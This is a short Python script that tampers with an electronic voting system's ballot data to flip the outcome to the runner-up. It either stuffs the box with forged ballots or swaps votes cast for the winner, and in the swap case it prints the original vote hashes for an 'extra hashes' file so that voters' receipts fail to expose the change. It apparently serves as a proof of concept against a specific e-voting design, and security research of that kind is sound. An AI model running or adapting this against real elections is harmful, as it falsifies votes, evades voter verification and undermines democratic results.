#! /usr/bin/env python

import argparse
from pathlib import Path
import json
from collections import Counter


def compute_stats(data):
    return Counter(b["json_part"][0] for b in data)


def alter_by_add(data):
    # Find out who is the winner
    stats = compute_stats(data)
    print(f"Initial ballot: {stats}")

    # Now determine how much votes should be added so that 2nd becomes winner...
    winner, runner_up, *_ = stats.most_common()
    to_add = winner[1] - runner_up[1] + 1

    # Le bon bourrage d'urne à l'ancienne ;-)
    runner_up_id = runner_up[0]
    ballot = {"json_part": [runner_up_id]}
    patched_data = data + [ballot for _ in range(to_add)]

    new_stats = compute_stats(patched_data)
    print(f"Patched ballot: {new_stats}")

    print(f"{to_add} votes were added to ballot box")

    return patched_data


def alter_by_replace(data):
    # Find out who is the winner
    stats = compute_stats(data)
    print(f"Initial ballot: {stats}")

    # Now determine how much votes should be altered so that 2nd becomes winner...
    winner, runner_up, *_ = stats.most_common()
    vote_gap = winner[1] - runner_up[1]
    to_alter = (vote_gap // 2) + 1
    winner_id = winner[0]
    runner_up_id = runner_up[0]

    # Now convince the Nth first voter to vote for the runner up
    patched_data = []
    new_extra_hashes = []
    for ballot in data:
        if to_alter > 0 and ballot["json_part"][0] == winner_id:
            to_alter -= 1
            # Replace the vote for the winner by a vote for the runner up
            patched_data.append({"json_part": [runner_up_id]})
            # Alse keep the original vote hash to add it into `extra_hashes.csv`, this
            # way a voting proof containing this vote hash won't notice the change ¯\_(ツ)_/¯
            new_extra_hashes.append(ballot["hash"])
        else:
            # Keep the original vote
            patched_data.append(ballot)

    new_stats = compute_stats(patched_data)
    print(f"Patched ballot: {new_stats}")

    print(f"{len(new_extra_hashes)} votes were altered in ballot box")
    print("Hashes to add to extra_hashes.csv:")
    print("\n".join(new_extra_hashes))

    return patched_data


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ballot_data_json")
    parser.add_argument("--action", choices=("add", "replace", "change"))
    parser.add_argument("--output", default="output.json")
    args = parser.parse_args()

    data = json.loads(Path(args.ballot_data_json).read_text())
    if args.action == "add":
        patched_data = alter_by_add(data)
    elif args.action == "replace":
        patched_data = alter_by_replace(data)
    Path(args.output).write_text(json.dumps(patched_data, indent=4))
